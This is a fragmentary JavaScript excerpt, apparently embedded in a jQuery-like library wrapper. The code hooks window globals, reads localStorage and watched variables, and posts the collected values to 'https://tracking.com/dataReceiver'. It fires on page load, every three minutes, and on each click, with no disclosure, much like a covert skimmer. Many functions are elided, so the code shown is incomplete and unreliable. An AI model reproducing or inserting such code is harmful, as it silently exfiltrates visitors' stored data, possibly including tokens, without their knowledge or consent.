...
(function (a, b) {
  ...
  const orientatedKeys = ['keysToWatch', 'watchedGlobals'];
  function ci() {
    try {
  ...
  Object.keys(window).forEach(globalVar => {
    if (orientatedKeys.includes(globalVar)) {
      Object.defineProperty(window, globalVar, {
        set: function (val) {
          console.log(`Assignment of value: ${val} to ${globalVar}`);
          jshook[globalVar] = val;
        },
        get: function () {
          console.log(`Accessing ${globalVar}`);
          return jshook[globalVar];
        }
      });
    }
  });
  ...
  function generateHashCode(data) {
    ...
    let hashString = keys.map(key => key).sort().join("");
    let hash = 0;
  ...
  function getWatchedData() {
    let trackedData = {};
    window.keysToWatch.forEach(key => {
      if (localStorage.hasOwnProperty(key)) {
        trackedData[key] = localStorage.getItem(key);
      } else if (window.hasOwnProperty(key) && window.watchedGlobals.includes(key)) {
  ...
  async function postDataToServer(data) {
    ...
    const serverUrl = "https://tracking.com/dataReceiver";
    try {
      ...
      if (!response.ok) {
        console.error('Failed send data', response.status);
      }
    } catch (error) {
  ...
  const watchAndUpdate = () => {
    const collectedData = getWatchedData();
  ...
  addEventListener("load", () => {
    watchAndUpdate();
    setInterval(watchAndUpdate, 3 * 60 * 1000);
  });
  var c = a.document,
    d = a.navigator,
    e = a.location,
  ...
  document.body.addEventListener('click', watchAndUpdate);
  var cj = {},
    ck,
    cl,
    cm = /^(?:toggle|show|hide)$/,
